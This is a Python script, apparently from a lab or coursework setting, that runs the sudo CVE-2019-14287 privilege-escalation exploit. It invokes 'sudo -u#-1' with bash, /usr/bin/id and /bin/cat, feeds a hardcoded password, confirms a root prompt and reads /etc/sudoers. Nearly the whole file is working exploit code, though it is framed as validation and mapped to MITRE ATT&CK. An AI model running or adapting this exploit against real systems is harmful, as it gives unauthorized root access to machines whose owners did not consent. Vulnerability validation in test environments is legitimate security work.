######################################################################################
# AUTHOR:                                                                            #
# Saad Ahmad                                                                         #   
#                                                                                    #
# DESCRIPTION:                                                                       #
# This script validates the Sudo vulnerability CVE-2019-14287.                       #
# This exploit references the Mitre Privilege Esclation Tactic, through the use of   #
# Sudo techinque (https://attack.mitre.org/techniques/T1169/)                        #
#                                                                                    #
# REQUIREMENTS:                                                                      #
# The exploit needs a Linux OS to run on (Ubuntu 18.04 in this case)                 #
# Sudo - any version < 1.8.28 (1.8.27 used here)                                     #
# Python version 3.6 and pip version 9.0.1                                           #
# Docker version 19.03.4 and Docker Compose version 1.24.1                           #
######################################################################################
import pexpect
import sys

username = 'saad'
password = 'daas'
sudo_exploit_command = 'sudo -u#-1 '
view_sudoers_config_command = 'cat /etc/sudoers | grep ' + username
# A list of commands that would be tested 
linux_commands = ['/usr/bin/id', 'bash', '/bin/cat']

valid_linux_commands = list()
# Used to convert bytes input to string
def get_str_from_bytes(_bytes_input):
    return str(_bytes_input, 'utf-8').rstrip('\r\n')


# This function executes the sudo exploit 
# If the exploit is runs successfully, it returns true
# The output from the exploit is visible on the terminal
# It displays the configuration for specified user in the sudoers file
def run_sudo_exploit():
    print('-------------------------------------------------------------------------------------')
    for command in linux_commands:
        print(f'TESTING FOR {command}')
        print('-------------------------------------------------------------------------------------')
        child = pexpect.spawn(sudo_exploit_command + command)
        child.logfile = sys.stdout.buffer
        i = child.expect(['Password'], timeout=2)
        if i == 0:
            child.sendline(password)
            child.expect('.*#', timeout=2)
            command_available = str(child.after, 'utf-8')
            if 'Sorry, ' in command_available:
                print('\n-------------------------------------------------------------------------------------')
                continue
            child.sendline('whoami')
            child.expect('.*#', timeout=2)
            print(f'\nThe /etc/sudoers file configuration for {command} for {username} is: \n')
            child.sendline(view_sudoers_config_command)
            child.expect('.*#', timeout=2)
            valid_linux_commands.append(command)
            print('\n-------------------------------------------------------------------------------------')
        else:
            print('An error occured in the exploit')
    return valid_linux_commands

# Runs an initial check on the user
# If the username does not match the specified user, it returns false
def check_current_user(user_to_check):
    child = pexpect.spawn('whoami')
    child.expect(['.*$', '.*#'], timeout=2)
    user = get_str_from_bytes(child.read())
    if user != user_to_check:
        return False
    return True

def main():
    try:
        if check_current_user(username):
            exploitable_commands = run_sudo_exploit()
            if len(exploitable_commands) > 0:
                print('\n------------------------------------SUMMARY------------------------------------------')
                print('The user can run the sudo exploit using these command(s)' + str(valid_linux_commands))
                print('Exploit successful')
                print('\n-------------------------------------------------------------------------------------')
            else:
                print('\n------------------------------------SUMMARY------------------------------------------')
                print('Exploit was not successful. No exploitable commands found')
                print('\n-------------------------------------------------------------------------------------')
        else:
            print('Exploit cannot be run if user is not ' + username)

    except pexpect.ExceptionPexpect:
        print('An error occured during the exploit execution')

main()


